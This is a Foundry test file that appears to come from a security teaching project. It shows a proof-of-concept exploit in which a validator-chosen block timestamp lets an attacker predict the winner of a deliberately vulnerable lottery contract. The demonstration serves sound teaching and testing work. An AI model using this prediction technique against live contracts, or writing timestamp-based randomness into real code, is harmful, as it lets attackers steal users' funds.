// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {Test} from "forge-std/Test.sol";
import {VulnerableLottery} from "../src/VulnerableLottery.sol";

contract LotterySecurityTest is Test {
    function testExploit_TimestampChoosesPredictableWinner() public {
        VulnerableLottery lottery = new VulnerableLottery();
        address[3] memory players = [address(0xA1), address(0xA2), address(0xA3)];

        for (uint256 i = 0; i < players.length; i++) {
            vm.deal(players[i], 1 ether);
            vm.prank(players[i]);
            lottery.enter{value: 1 ether}();
        }

        // Simulate a validator choosing a specific, plausible timestamp (Concept 9) —
        // computed OFF-CHAIN here exactly the way an attacker reading the pending
        // block could, then used to predict the outcome BEFORE drawWinner() runs.
        uint256 chosenTimestamp = block.timestamp + 12; // one plausible next-block offset
        vm.warp(chosenTimestamp);
        uint256 predictedIndex = uint256(keccak256(abi.encode(chosenTimestamp))) % players.length;
        address predictedWinner = players[predictedIndex];

        address actualWinner = lottery.drawWinner();
        assertEq(actualWinner, predictedWinner);   // predicted BEFORE the call — the exploit succeeds
    }
}